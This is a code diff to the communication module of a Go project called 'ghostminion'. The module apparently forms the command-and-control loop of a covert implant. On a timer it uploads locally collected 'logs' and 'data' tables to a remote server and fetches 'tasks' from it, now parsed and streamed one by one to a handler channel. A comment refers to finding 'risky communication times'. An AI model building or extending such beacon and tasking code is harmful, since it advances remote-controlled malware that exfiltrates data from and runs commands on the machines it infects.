@@ -3,9 +3,11 @@ package communication
 import (
 	"encoding/json"
 	"fmt"
+	"ghostminion/apps"
 	"ghostminion/config"
 	"ghostminion/db"
 	"math/rand"
+	"strconv"
 	"time"
 )
 
@@ -20,7 +22,9 @@ todo: search for more risky communication times
 
 */
 
-func CommunicationRoutine(intervalSeconds int) {
+func Routine(taskCh chan<- apps.AppData) {
+	conf, _ := config.GetConfig()
+	intervalSeconds, _ := strconv.Atoi(conf.Communication.Interval)
 	ticker := time.NewTicker(time.Duration(intervalSeconds) * time.Second)
 	defer ticker.Stop()
 
@@ -32,8 +36,10 @@ func CommunicationRoutine(intervalSeconds int) {
 		} else {
 			sendData("logs")
 			sendData("data")
-			tasks := getTasks(serverConfig) // TODO: handle the tasks
-			HandleTasks(tasks)
+			tasks := getTasks(serverConfig)
+			for _, task := range tasks { // stream each task individually
+				taskCh <- task
+			}
 		}
 	}
 }
@@ -61,8 +67,8 @@ func sendData(table string) {
 	}
 }
 
-func getTasks(serverConfig config.ServerConfig) []byte {
-	tasks, _, err := SendRequest(
+func getTasks(serverConfig config.ServerConfig) []apps.AppData {
+	tasksRaw, _, err := SendRequest(
 		GET,
 		CreateRoute(serverConfig, "tasks"),
 		map[string]string{
@@ -74,6 +80,13 @@ func getTasks(serverConfig config.ServerConfig) []byte {
 		fmt.Println("Error:", err)
 		return nil
 	}
+
+	var tasks []apps.AppData
+	if err := json.Unmarshal(tasksRaw, &tasks); err != nil {
+		fmt.Println("Failed to unmarshal tasks:", err)
+		return nil
+	}
+
 	return tasks
 }
 
